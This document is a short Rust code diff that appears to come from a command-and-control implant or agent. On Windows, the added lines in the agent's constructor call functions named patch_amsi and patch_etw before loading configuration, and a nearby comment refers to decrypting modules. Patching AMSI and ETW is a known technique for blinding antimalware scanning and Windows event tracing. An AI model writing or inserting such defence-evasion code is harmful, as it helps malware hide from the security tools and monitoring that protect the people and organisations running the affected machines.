@@ -40,6 +40,13 @@ pub struct Agent {
 
 impl Agent {
     pub fn new(transport: Box<dyn Transport + Send>) -> Result<Self> {
+        // Apply AMSI/ETW evasion patches before continuing
+        #[cfg(windows)]
+        unsafe {
+            evasion::patch_amsi();
+            evasion::patch_etw();
+        }
+
         let cfg = config::load_config()?;
 
         // Derive the module-decryption key from configuration.
